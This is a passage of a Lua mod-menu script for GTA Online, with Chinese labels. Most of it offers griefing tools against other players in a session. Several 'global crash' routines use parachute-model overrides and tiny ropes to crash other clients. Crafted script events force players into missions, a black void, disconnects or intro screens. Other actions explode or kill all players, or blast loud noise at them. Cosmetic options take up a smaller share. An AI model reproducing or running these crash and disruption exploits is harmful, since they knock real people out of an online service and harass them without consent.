  while not STREAMING.HAS_MODEL_LOADED(object_hash) do
       util.yield()
     end
    PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
    util.yield(800)
    for i = 0 , 20 do
    PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
    end
    util.yield(800)
    menu.trigger_commands("tpmazehelipad")
    end
    notification("崩溃执行结束" ,colors.black)
end)

menu.action(quanjubengkui, "人物伞崩全局V8", {""}, "", function()
notification("开始崩溃", colors.black)
for n = 0 , 2 do
    PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    object_hash = 1381105889
                                STREAMING.REQUEST_MODEL(object_hash)
  while not STREAMING.HAS_MODEL_LOADED(object_hash) do
       util.yield()
     end
    PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
    util.yield(1000)
    for i = 0 , 2 do
    PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
    end
    util.yield(1000)
    menu.trigger_commands("tpmazehelipad")
    bush_hash = 720581693
                                STREAMING.REQUEST_MODEL(bush_hash)
  while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
       util.yield()
     end
    PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
       util.yield(1000)
    for i = 0 , 5 do
    PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
    end
    util.yield(1000)
    menu.trigger_commands("tpmazehelipad")
    bush_hash = 1117917059
    STREAMING.REQUEST_MODEL(bush_hash)
while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
util.yield()
end
PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
util.yield(1000)
for i = 0 , 2 do
PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
end
util.yield(1000)
menu.trigger_commands("tpmazehelipad")
bush_hash = 4237751313
STREAMING.REQUEST_MODEL(bush_hash)
while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
util.yield()
end
PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
util.yield(1000)
for i = 0 , 2 do
PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
end
util.yield(1000)
menu.trigger_commands("tpmazehelipad")
bush_hash = 2365747570
STREAMING.REQUEST_MODEL(bush_hash)
while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
util.yield()
end
PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
util.yield(1000)
for i = 0 , 2 do
PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
end
util.yield(1000)
menu.trigger_commands("tpmazehelipad")
end
notification("崩溃执行结束" ,colors.black)
end)
    menu.action(quanjubengkui, "息怒崩（极其生气的时候用此功能）", {}, "请在极其生气时使用此功能", function()
      local notification = b_notifications.new()
      notification.notify("你好陌生人！","游戏并非只有制裁，更多的是带给其他人快乐，希望可以给其他玩家一个好的游戏体验！")
      YMscript_logo = directx.create_texture(filesystem.scripts_dir() .. '/YMS/'..'xinu.png')
      if SCRIPT_MANUAL_START then
    AUDIO.PLAY_SOUND(-1, "Virus_Eradicated", "LESTER1A_SOUNDS", 0, 0, 1)
    logo_alpha = 0
    logo_alpha_incr = 0.01
    logo_alpha_thread = util.create_thread(function (thr)
        while true do
            logo_alpha = logo_alpha + logo_alpha_incr
            if logo_alpha > 1 then
                logo_alpha = 1
            elseif logo_alpha < 0 then
                logo_alpha = 0
                util.stop_thread()
            end
            util.yield()
        end
    end)

    logo_thread = util.create_thread(function (thr)
        starttime = os.clock()
        local alpha = 0
        while true do
            directx.draw_texture(YMscript_logo,  0.1, 0.3, 0.3, 0.6, 0.35, 0.5,0, 3, 3, 3, logo_alpha)
            timepassed = os.clock() - starttime
            if timepassed > 6 then
                logo_alpha_incr = -0.01
            end
            if logo_alpha == 0 then
                util.stop_thread()
            end
            util.yield()
        end
    end)
end
      store_dir = filesystem.store_dir() .. '\\YMss\\'
      sound_selection_dir = store_dir .. '\\sound4.txt'
      if not filesystem.is_dir(store_dir) then
         util.toast("夜幕音频没有正确安装！.")
         util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    --PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
        jesus_help_me()
    end)
menu.action(quanjubengkui, "同步崩溃", {}, "", function(state)   
    fishmm = state
        local TargetPPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPPos = ENTITY.GET_ENTITY_COORDS(TargetPPed)
        ENTITY.SET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1992.8982, -780.7021, -0.37660158, false, false, false, false)
        menu.trigger_commands("levitatepassivemax 0")
        menu.trigger_commands("levitateassistup 0")
        menu.trigger_commands("levitateassistdown 0")
        menu.trigger_commands("noguns")
        menu.trigger_commands("invisibility on")
        util.yield(1000)
        menu.trigger_commands("acfish")
        util.yield(100)
        menu.trigger_commands("levitate on")
        util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1813897027,15,true,true)
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),TargetPPos.x,TargetPPos.y,TargetPPos.z, false, false, false, false)
        util.yield(100)
    util.yield(9000)
    if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
        menu.trigger_commands("mpmale")
    else
        menu.trigger_commands("mpfemale")
    end
    menu.trigger_commands("levitatepassivemax 0.6")
    menu.trigger_commands("levitateassistup 0.6")
    menu.trigger_commands("levitateassistdown 0.6")
    menu.trigger_commands("levitate off")
    menu.trigger_commands("noguns")
    menu.trigger_commands("invisibility off")
    notification("ok",colors.red)
    while fishmm do
        util.yield()
        PAD._SET_CONTROL_NORMAL(0, 25, 1)
    end
    end)
menu.action(quanjubengkui, "改进数学崩溃", {"math2"}, "", function()
    local getPlayerPed = PLAYER.GET_PLAYER_PED
    local getEntityCoords = ENTITY.GET_ENTITY_COORDS
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local ppos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    pos.x = pos.x+5
    ppos.z = ppos.z+1
    Utillitruck3 = entities.create_vehicle(2132890591, pos, 0)
    Utillitruck3_pos = ENTITY.GET_ENTITY_COORDS(Utillitruck3)
    kur = entities.create_ped(26, 2727244247, ppos, 0)
    kur_pos = ENTITY.GET_ENTITY_COORDS(kur)

    ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
    newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, Utillitruck3, kur, Utillitruck3_pos.x, Utillitruck3_pos.y, Utillitruck3_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center")
    util.yield(100)
    ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
    newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, Utillitruck3, kur, Utillitruck3_pos.x, Utillitruck3_pos.y, Utillitruck3_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center") 
    util.yield(100)

    PHYSICS.ROPE_LOAD_TEXTURES()
    local hashes = {2132890591, 2727244247}
    local pc = getEntityCoords(getPlayerPed(PlayerID))
    local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pc.x + 5, pc.y, pc.z, 0, true, true, false)
    local ped = PED.CREATE_PED(26, hashes[2], pc.x, pc.y, pc.z + 1, 0, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
    ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
    ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
    local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
    local vehc = getEntityCoords(veh); local pedc = getEntityCoords(ped)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
    util.yield(1000)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    PHYSICS.DELETE_CHILD_ROPE(rope)
    PHYSICS.ROPE_UNLOAD_TEXTURES()
end)
menu.action(quanjubengkui,"月明星稀",{"yuemingxingxi"},"",function()
    notification( "等待10-15秒崩溃进程", colors.black)
    menu.trigger_commands("anticrashcam on")
    local user = players.user()
    local user_ped = players.user_ped()
    local pos = players.get_position(user)
    local cspped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TPpos = ENTITY.GET_ENTITY_COORDS(cspped, true)
    local cargobob = CreateVehicle(0XFCFCB68B, TPpos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    local cargobobPos = ENTITY.GET_ENTITY_COORDS(cargobob, true)
    local veh = CreateVehicle(0X187D938D, TPpos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    local vehPos = ENTITY.GET_ENTITY_COORDS(veh, true)
    local newRope = PHYSICS.ADD_ROPE(TPpos.x, TPpos.y, TPpos.z, 0, 0, 10, 1, 1, 0, 1, 1, false, false, false, 1.0, false, 0)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, veh, cargobobPos.x, cargobobPos.y, cargobobPos.z, vehPos.x, vehPos.y, vehPos.z, 2, false, false, 0, 0, "Center", "Center")
        util.yield(80)
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
        TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
        util.yield()
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
        util.yield(250)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        util.yield(1000)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x,pos.y,pos.z, 0, false, false, 0)
        util.yield(2500)
    entities.delete_by_handle(cargobob)
    entities.delete_by_handle(veh)
    PHYSICS.DELETE_CHILD_ROPE(newRope)
    menu.trigger_commands("anticrashcam off")
        notification( "月明星稀---崩溃结束", colors.black)
    end)
menu.action(quanjubengkui, "911每天都很想静静(全局崩溃)",{}, "", function()
    notification( "等待10-15秒崩溃进程", colors.black)
    Change_player_model(0x9C9EFFD8)
    local land_area = {
        v3(1798.031,-2831.863,3.562),
        v3(-245.300,-656.019,33.168),
        v3(-2561.787,3175.436,32.820),
        v3(58.667,7198.895,3.372),
        v3(1279.582,3064.881,40.534),
        v3(3003.555,5777.601,300.729),
        v3(460.582,5572.078,781.179),
        v3(3615.213,5024.245,11.396),
        v3(3668.583,5645.834,11.537),
        v3(2027.388,-1588.856,251.008),
        v3(-1240.75,-587.97,27.25)
        }
    for i ,crashpos in pairs(land_area) do
    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),0xE5022D03)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped(players.user()))
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    wait(30)
        local crash_num = 2
        pack_crash = util.create_thread(function()
            while crash_num == 2 do
                    for set_para_packmodel = 0 ,50 do
                        wait(100)      				
                    end
                end
        end,nil)
        pos = crashpos
        pos.z = pos.z + 0.22
        local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(crashpos, pos.x, pos.y, pos.z)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),p_pos.x,p_pos.y,p_pos.z,false,true,true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(players.user_ped(players.user()),0xFBAB5776, 1000, false)
        TASK.TASK_PARACHUTE_TO_TARGET(players.user_ped(players.user()),-1087,-3012,13.94)
        wait(600)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped(players.user()))		
        wait(1000)
    end
    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped(players.user()))
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(players.user()),-1087,-3012,13.94)
     notification( "911每天都很想静静---崩溃结束", colors.black)
end)
menu.action(quanjubengkui, "双重人格？！", {"sixfeel"}, "给我坐下！", function(shuangchong)
   if shuangchong then
    chat.send_message("我有双重人格，对不起！", false, true, true)
      wait(4500)
    chat.send_message("不行了，我的第二人格要出现了", false, true, true)
      wait(5000)
    chat.send_message("谁让你跑了给我坐下？", false, true, true)
      wait(1500)
    notification("等待10-15秒崩溃进程", colors.black)
    local getEntityCoords = ENTITY.GET_ENTITY_COORDS
    local getPlayerPed = PLAYER.GET_PLAYER_PED
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))
    local ppos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))
    local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))
    pos.x = pos.x+5
    ppos.z = ppos.z+1
    Utillitruck3 = entities.create_vehicle(2132890591, pos, 0)
    Utillitruck3_pos = ENTITY.GET_ENTITY_COORDS(Utillitruck3)
    kur = entities.create_ped(26, 2727244247, ppos, 0)
    kur_pos = ENTITY.GET_ENTITY_COORDS(kur)
    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),0xE5022D03)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    wait(50)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),p_pos.x,p_pos.y,p_pos.z,false,true,true)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 0xFBAB5776, 1000, false)
    TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1087,-3012,13.94)
    wait(500)
    ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
    newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, Utillitruck3, kur, Utillitruck3_pos.x, Utillitruck3_pos.y, Utillitruck3_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center")
    wait(100)
    ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
    newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, Utillitruck3, kur, Utillitruck3_pos.x, Utillitruck3_pos.y, Utillitruck3_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center") 
    wait(100)
    PHYSICS.ROPE_LOAD_TEXTURES()
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    wait(1000)
    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    local hashes = {2132890591, 2727244247, 1663218586, -891462355}
    local pc = getEntityCoords(getPlayerPed(PlayerID))
    local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pc.x + 5, pc.y, pc.z, 0, true, true, false)
    local ped = PED.CREATE_PED(26, hashes[2], pc.x, pc.y, pc.z + 1, 0, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
    ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
    ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
    local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
    local vehc = getEntityCoords(veh); local pedc = getEntityCoords(ped)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
    wait(1000)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    PHYSICS.DELETE_CHILD_ROPE(rope)
    PHYSICS.ROPE_UNLOAD_TEXTURES()
   end
   notification( "双重人格？！---崩溃结束", colors.black)
end)
quanjuegao = menu.list(quanju,"全局恶搞", {},"恶搞全局~")
menu.toggle_loop(quanjuegao,  "禁止进入天基炮室", {}, "拒绝轰炸，从我做起！", function()
    local mdd = util.joaat("h4_prop_h4_garage_door_01a")
    if orb_obj_smc == nil or not ENTITY.DOES_ENTITY_EXIST(orb_obj_smc) then
        orb_obj_smc = entities.create_object(mdd, v3(335.9, 4833.9, -59.0))
        ENTITY.SET_ENTITY_HEADING(orb_obj_smc, 125.0)
        ENTITY.FREEZE_ENTITY_POSITION(orb_obj_smc, true)
    end
end,function()
    if orb_obj_smc ~= nil then
        entities.delete_by_handle(orb_obj_smc)
    end
end)
menu.toggle_loop(quanjuegao,  "阻挡进入高跟鞋", {}, "拒绝奖励，从我做起！", function()
    local mdd = util.joaat("h4_prop_h4_garage_door_01a")
    local pos = players.get_position(players.user())
    if orb_obj_hh == nil or not ENTITY.DOES_ENTITY_EXIST(orb_obj_hh) then
        orb_obj_hh = entities.create_object(mdd, v3(128, -1298.5, 29.5))
        ENTITY.SET_ENTITY_ROTATION(orb_obj_hh, 0.0, 0.0, 30, 1, true)
        ENTITY.FREEZE_ENTITY_POSITION(orb_obj_hh, true)
    end
end,function()
    if orb_obj_hh ~= nil then
        entities.delete_by_handle(orb_obj_hh)
    end
end)
menu.toggle_loop(quanjuegao, "脚本主机轮盘", {}, "循环给予所有人脚本主机\n可能破坏战局", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        menu.trigger_commands("givesh" .. players.get_name(pid))
        util.yield(1500)
    end
end)
    menu.action(quanjuegao, "全局公寓邀请", {}, "", function () 
        sendscriptevent_three()
    end)
    menu.action(quanjuegao, "全局送进任务", {}, "", function () 
    for PlayerID = 0, 31 do
		if PlayerID ~= players.user() and players.exists(PlayerID) then

			util.trigger_script_event(1 << PlayerID, {1858712297, -1, 1, 1, 0, 1, 0,PLAYER.GET_PLAYER_INDEX(), PlayerID})
		end
	end
end)
menu.action(quanjuegao, "全局黑色虚空", {}, "", function () 
    for PlayerID = 0, 31 do
        if PlayerID ~= players.user() and players.exists(PlayerID) then
            util.trigger_script_event(1 << PlayerID, {1268038438, PlayerID, 81, 1, 0, 1, 1130429716, -1001012850, 1106067788, 0, 0, 1, 2123789977, 1, -1})
        end
    end
end)
menu.action(quanjuegao, "匿名杀人", {}, "匿名杀死所有人", function()
    nimingsharen()
end)
menu.action(quanjuegao, '爆炸所有人', {}, '爆炸所有玩家.', function()
    local playerList = getNonWhitelistedPlayers(whitelistListTable, whitelistGroups, whitelistedName)
    for _, PlayerID in pairs(playerList) do
        local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        explodePlayer(playerPed, false, expSettings)
    end
end)
explodeLoopAll = menu.toggle_loop(quanjuegao, '循环爆炸所有人', {}, '不断的爆炸所有玩家.', function()
    local playerList = getNonWhitelistedPlayers(whitelistListTable, whitelistGroups, whitelistedName)
    for _, PlayerID in pairs(playerList) do
        local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        explodePlayer(playerPed, true, expSettings)
    end
end)
menu.action(quanjuegao, "全局骚扰", {"bedsound", "earrape"}, "在战局中播放大量的噪音，声音记得提前调整！", function()
       zaoyin()
       util.yield(500)
       notification("开始全局骚扰！",colors.black)
end)
menu.action(quanjuegao, "全局传送DC", {}, "", function () 
    for k,v in pairs(players.list(false, true, true)) do
		util.trigger_script_event(1 << v, {2139870214, 2, 0, 0, 4, 0,PLAYER.GET_PLAYER_INDEX(), v})
	end
end)
menu.action(quanjuegao, "发送到介绍界面", {"introall"}, "将战局中的每个人都送到GTAOnline的介绍动画中去.", function()
    for _, PlayerID in players.list(false, true, true) do
        local int = memory.read_int(memory.script_global(1894573 + 1 + (PlayerID * 608) + 510))
        if not StandUser(PlayerID) then
            util.trigger_script_event(1 << PlayerID, {-95341040, players.user(), 20, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
            util.trigger_script_event(1 << PlayerID, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        end
    end
end)

menu.action(quanjuegao, "发送到高尔夫俱乐部", {"golf"}, "让战局中所有人都去打高尔夫.", function()
    for _, PlayerID in players.list(false, true, true) do
        local int = memory.read_int(memory.script_global(1894573 + 1 + (PlayerID * 608) + 510))
        if not StandUser(PlayerID) then
            util.trigger_script_event(1 << PlayerID, {-95341040, players.user(), 193, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
            util.trigger_script_event(1 << PlayerID, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        end
    end
end)
menu.action(quanjuegao, "将所有人传送到海洋", {"alltpvehocean"}, "", function()
    TeleportEveryonesVehicleToOcean()
end)
menu.action(quanjuegao, "将所有人传送到花园银行楼顶 ", {"alltpvehmazebank"}, "", function()
    TeleportEveryonesVehicleToMazeBank()
end)
--看门狗模式
    require "lib.YeMulib.YMwtds"
menu.action(online, "玩家栏", {}, "", function()
    menu.trigger_commands("YMScript " .. players.get_name(players.user()))
end)
play_info =menu.list(online, "战局玩家信息", {}, "")
    require "lib.YeMulib.YMInfOverlay"
play_infoV2 = menu.list(online,"战局玩家信息V2", {},"")
play_infoV22 = menu.action(play_infoV2, "加载战局玩家信息V2", {""}, "", function()
        notification("正在加载战局玩家信息V2,请稍等...",colors.black)
        util.yield(1500)
        require "lib.YeMulib.YMInfOverlayV2"
        menu.delete(play_infoV22)
end)
deathlog_lt = menu.list(online,'死亡日志', {}, '记录谁杀了你')
        menu.toggle_loop(deathlog_lt,'开启', {}, '', function ()
            death_log()
        end)
        menu.action(deathlog_lt,'打开文件夹', {}, '', function ()
            open_dea_log()
        end)
        menu.action(deathlog_lt,'清除日志', {}, '', function ()
            clear_dea_log()
end)
local onlineplayer = menu.list(online, "战局玩家加入提醒", {}, "")
joining = false
menu.toggle(onlineplayer, "玩家加入通知", {}, "玩家加入战局时通知", function(on_toggle)
	if on_toggle then
		joining = true
	else
		joining = false
	end
end)
local exterior = menu.list(self, "外观选项", {}, "")
menu.toggle(exterior, "金色翅炎", {}, "如果不起作用请重试", function(on_toggle)
	if on_toggle then	
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
	local wings = OBJECT.CREATE_OBJECT(util.joaat("vw_prop_art_wings_01a"), pos.x, pos.y, pos.z, true, true, true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(util.joaat("vw_prop_art_wings_01a"))
	ENTITY.ATTACH_ENTITY_TO_ENTITY(wings, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 0x5c01), -1.0, 0.0, 0.0, 0.0, 90.0, 0.0, false, true, false, true, 0, true)
else
	local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
			end
end)
menu.action(exterior, "恶灵骑士", {""}, "获得恶灵骑士。", function()
    elqes()
end)
local _LR = menu.list(exterior, '火焰之翼选项', {}, '')

        
        menu.toggle(_LR, '火焰之翼', {'fireWings'}, '请打开无敌食用！！！~.', function (toggle)
            firewing(toggle)
        end)

        menu.slider(_LR, '火焰之翼比例', {'fireWingsScale'}, '', 1, 100, 3, 1, function(value)
            firewingscale(value)
        end)

        menu.rainbow(menu.colour(_LR, '火焰之翼颜色', {'JSfireWingsColour'}, '', fireWingsSettings.colour, false, function(colour)
            firewingcolour(colour)
        end))
        menu.list_action(exterior, "寄吧选项", {}, "你好瑟瑟", opt_pp, function(index, value, click_type)
            getbigjb(index, value, click_type)
        end)
menu.toggle(exterior, "雪人先生",{""}, "",function(on)
    local sonwman = "prop_prlg_snowpile"
    if on then
        attach_to_player(sonwman, 0, 0.0, 0, 0, 0, 0,0)
        attach_to_player(sonwman, 0, 0.0, 0, -0.5, 0, 0,0)--v_ilev_exball_grey
        attach_to_player(sonwman, 0, 0.0, 0, -1, 0, 0,0)
    else
        delete_object(sonwman)
    end
end)
    function loadModel(hash)
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end
    end
        local fireWings = {
            [1] = {pos = {[1] = 120, [2] =  75}},
            [2] = {pos = {[1] = 120, [2] = -75}},
            [3] = {pos = {[1] = 135, [2] =  75}},
            [4] = {pos = {[1] = 135, [2] = -75}},
            [5] = {pos = {[1] = 180, [2] =  75}},
            [6] = {pos = {[1] = 180, [2] = -75}},
            [7] = {pos = {[1] = 190, [2] =  75}},
            [8] = {pos = {[1] = 190, [2] = -75}},
			[9] = {pos = {[1] = 130, [2] =  75}},
            [10] = {pos = {[1] = 130, [2] = -75}},
			[11] = {pos = {[1] = 140, [2] =  75}},
            [12] = {pos = {[1] = 140, [2] = -75}},
			[13] = {pos = {[1] = 150, [2] =  75}},
            [14] = {pos = {[1] = 150, [2] = -75}},
			[15] = {pos = {[1] = 210, [2] =  75}},
            [16] = {pos = {[1] = 210, [2] = -75}},
			[17] = {pos = {[1] = 195, [2] =  75}},
            [18] = {pos = {[1] = 195, [2] = -75}},
			[19] = {pos = {[1] = 160, [2] =  75}},
            [20] = {pos = {[1] = 160, [2] = -75}},
			[21] = {pos = {[1] = 170, [2] =  75}},
